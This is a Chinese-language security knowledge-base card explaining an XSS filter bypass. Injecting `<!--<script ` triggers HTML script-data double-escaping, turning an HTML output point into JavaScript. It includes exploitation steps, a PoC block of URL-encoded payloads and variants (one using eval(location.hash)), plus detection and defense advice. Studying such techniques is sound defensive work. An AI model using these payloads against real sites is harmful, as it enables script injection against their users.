---
id: web-generic-xss-script-tag-html-comment-double-escape
title: '`<!--<script >` 触发 script data escaped/double-escaped 重解析：把 HTML 输出点变成 JS'
type: scenario
domain: web
path: web/generic/xss
technique: xss-script-data-double-escape
aliases:
- script data double escaped
- <!--<script 逃逸
- HTML 注释重解析 XSS
- 双输出点 XSS
- HTML 输出点变 JS
tags:
- xss
- javascript
- html-parser
- script-tag
- comment
- filter-bypass
- parser-state
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-10'
verification:
  verified_by: verifier-V446
  verified_at: '2026-11-10T00:44:24+08:00'
  notes: 已对照13794原文slide19-34逐张核对：无空格时双转义起点被反斜杠阻断、带空格才进入double-escaped、真正的结束标签只退回escaped、由页面注释的右箭头序列退出，均与原文一致；主PoC与slide27/34一致，script赋值变体与slide28一致，Huuuuu/香草变体逐字核对一致。核对中修正本卡：zeddy变体原误把反引号写成单引号，已恢复原文反引号写法并经node语法检查通过；另修正解码注释多余空格、拼接行漏写的反斜杠、步骤3中注释符与script片段的先后顺序。注意slide34所示zeddy精简版URL字符为反引号斜杠反斜杠（疑原文笔误），卡中保留按原文文字描述的把块注释替换为双斜杠版本，node语法检查通过。未在真实浏览器或目标环境复跑。dedup top候选为自身已入库记录及nonglobal-replace等related，非同一条利用链。
---

## 一句话结论

当输入同时被 JS 字符串与后续 HTML 文本两个输出点回显、两侧分别做反斜杠转义与实体编码而都无法直接打穿时，在脚本内容里注入 `<!--<script `（`script` 后带空白）可让 HTML tokenizer 依次进入 script data escaped 与 script data double-escaped 状态，使页面真正的 `</script>` 不再结束脚本元素，后续 HTML 输出点整体落入脚本数据并被当作 JS 解析，从而把原本安全的 HTML 上下文输出点改成可执行 JS。

## 原理

- **HTML5 script 数据状态机**：`<script>` 元素内容默认处于 script data 状态，只有匹配的 `</script` 才能结束元素。script data 内出现 `<!--` 会进入 script data escaped 状态；在 escaped 状态下再出现 `<script` 且标签名后紧跟空白、`/` 或 `>`，会进入 script data double-escaped 状态。
- **double-escaped 的效果**：在 double-escaped 状态下遇到页面真正的 `</script>` 只会退回 escaped 状态，并不结束脚本元素；之后需由 `-->`（页面通常自带，如 `<!--px-->` 注释）退出 escaped 回到普通 script data，再由后续 `</script>` 正常收尾。于是第一个脚本元素的文本内容被“延长”到页面后面的 HTML 区域。
- **后续 HTML 为何变成 JS**：`</script>` 失效后，后面的普通文本、`<div>` 输出点、页面自带注释与第二个 `<script>` 块都成为第一个脚本元素的脚本数据，整体交给 JS 解析器；原本经过 HTML 实体编码的 HTML 输出点，其文本因此进入 JS 源码作用域。
- **为什么必须给 `<script` 加空格**：JS 输出侧对 `<`、`>` 做反斜杠转义，输入 `<!--<script>` 在源码里变成 `\<!--\<script\>`；double-escape-start 要求标签名 `script` 之后紧跟空白、`/` 或 `>`，而这里紧跟的是被转义后的 `\`，状态机判定失败、不进入 double-escaped，真正的 `</script>` 仍会正常结束脚本。写成 `<!--<script >`（`script` 后加空格）后，标签名后紧跟空白字符，状态机按 HTML5 规则进入 double-escaped，其后的 `\>` 不再影响判定；带空格写法还能顺带规避按完整 `<script>` 字面量匹配的过滤/整体转义规则，属于“过滤器与解析器不一致”。
- **执行点如何组织**：状态改写成功后，需要 JS 侧有可执行表达式。示例用 `\'`（字面反斜杠 + 引号）让服务端生成 `\\'`——`\\` 在 JS 字符串中是字面反斜杠，后面的引号因此提前闭合字符串；接 `-alert(1)-`（或 `-(script=alert(1))-`）构成表达式求值。再用反引号开启模板字面量，让模板穿过被重解析的区域吸收 `<div>` 等无关文本，HTML 输出点中的输入副本提供关闭反引号；模板闭合后用 `//` 注释残余，页面自带 `<!--px-->` 同时充当 JS 单行注释与退出 escaped 所需的 `-->`。

## 触发条件

- 同一参数被同步输出到两处：一处在 `<script>` 内的 JS 字符串，另一处在脚本之后的 HTML 文本（如 `var px='INPUT';` 与 `<div>INPUT</div>`）。
- JS 侧对 `'`、`<`、`>` 做反斜杠转义且不转义 `\`（可用 `\'` 制造 `\\'` 提前闭合字符串），HTML 侧对 `<`/`>` 做实体编码；两侧单独都无法直接闭合或注入标签。
- 注入点之后存在 `-->`（页面自带注释或 payload 自带），用于退出 escaped 状态；最终存在可正常收尾的 `</script>`。
- 无严格 CSP（内联脚本可执行）。

## 利用步骤

1. 确认两处输出点：JS 字符串与后续 HTML 文本；确认 JS 侧把 `<`/`>` 转成 `\<`/`\>`，HTML 侧实体编码。
2. 在 JS 字符串输出点用 `\'` 使源码出现 `\\'` 提前闭合字符串，接 `-alert(1)-` 之类的表达式（或 `-(script=alert(1))-` 同时定义 `script` 变量）。
3. 用反引号开启模板字面量，先写入 `//`，再写入 `<!--<script `（`script` 后必须带空白），让 tokenizer 进入 double-escaped；模板在 HTML 输出点副本的反引号处闭合后，`//` 注释掉该行残余文本。
4. HTML 输出点中的输入副本携带第二个反引号关闭模板；页面后面的 `<!--px-->` 提供 `-->` 退出 escaped，最终 `</script>` 正常结束脚本。
5. 浏览器验证弹窗；Console 若报 `ReferenceError: script is not defined`，说明尾部 `<script>` 文本被当 JS 解析，可在第 2 步改用 `(script=alert(1))` 先定义 `script`，或在弹窗已执行的前提下忽略报错。

## PoC

```text
# 页面：同一参数一处落入 JS 字符串、一处落入 HTML 文本，后接自带注释与第二个 script 块
<script>
var px='INPUT';
</script>
give me xss by pass~7
<div style="display:none">INPUT</div>
<!--px-->
<script>
'px'
</script>

# 作者短解：\' 逃出单引号 → -alert(1)- 求值 → 反引号开模板 → // 注释 → <!--<script 带空格
?px=111\%27-alert(1)-`//<!--<script%20
# 解码：111\'-alert(1)-`//<!--<script
# 拼接后第一行：var px='111\\'-alert(1)-`//\<!--\<script ';
# 第二个反引号来自 HTML 输出点副本，模板吸收中间代码；// 注释掉 HTML 侧残余

# 同时定义 script 变量、消除尾部 ReferenceError
?px=111\%27-(script=alert(1))-`//<!--<script%20
# 解码：111\'-(script=alert(1))-`//<!--<script

# 社区变体（zeddy）：<!--<script 放最前，无用的单引号串/模板串分置，%0a 换行 + /* */ 注释
?px=%3C!--%3Cscript%20`)/*\%27%0aalert(1)%0aalert(`*///

# zeddy 的精简版：把 /* */ 换成 //，去掉多余 alert
?px=<!--<script%20`//\%27-alert(1)-`

# 社区变体（Huuuuu）：无用内容分置单引号串与模板串
?px=`//*%3C!--%3Cscript%20%3E\%27-alert(1)-`

# 社区变体（香草）：alert 放 hash，用 eval(location.hash.slice(1)) 执行，绕过 px 长度限制
?px=\%27-`-eval(location.hash.slice(1))//%3C!--%20%3Cscript%20%3E`-`#alert(1)
```

## 变体与关联

- 变体：执行载体不限于 `-alert(1)-`，任何能在字符串闭合后求值的表达式均可；`(script=alert(1))` 写法可消除尾部 `<script>` 被当 JS 解析产生的 `ReferenceError`。
- 变体：hash 长度绕过——`eval(location.hash.slice(1))` 放在 px 内，真正的 `alert(1)` 放在 `#` 之后，用于突破参数长度限制；这是同一动作的长度受限写法，不单独成卡。
- 关联：[[web-generic-xss-template-literal-absorbs-unclosed-quote]]（两处输出点都在 JS 内时的模板吸收手法；本卡后半段复用其模板/表达式思路）；[[web-generic-xss-javascript-context-injection]]（JS 字符串闭合与表达式位置基础）；[[web-generic-xss-json-eval-backslash-escape]]（`\` 未转义导致 `\\'` 逃逸的同类转义缺陷）；[[web-generic-xss-operator-expression-injection]]（表达式注入载体）。
- 双输出点背景：本卡与“两个输出点都在 JS 内”的另一类场景共享“同一参数同步双回显”前提，本卡只负责其中一处落在 HTML、需要靠解析器状态改写把 HTML 输出点变成 JS 的情况。

## 检测与防御

- 检测：请求中出现 `<!--` 与 `<script`（尤其 `script` 后带空白的变体）、`</script`、反引号与 `<!--<script ` 组合；响应中同一参数同时出现在内联脚本与 HTML 文本两处，且 HTML 输出点位于脚本之后。
- 防御：在 JS 输出中转义 `<`、`>`、`&`、`'`、`"`、反斜杠与反引号，或直接不拼接生成 JS，使用 `JSON.stringify`/`json_encode`；HTML 输出保持实体编码；避免在脚本之后放置可由同一输入影响的 HTML 输出点；启用禁止 `unsafe-inline` 的 CSP。
- 局限：依赖 HTML5 tokenizer 的 escaped/double-escaped 状态与页面中 `-->` 的配合；若输入在 JS 侧被完整转义（含反斜杠）或存在严格 CSP，则失效。
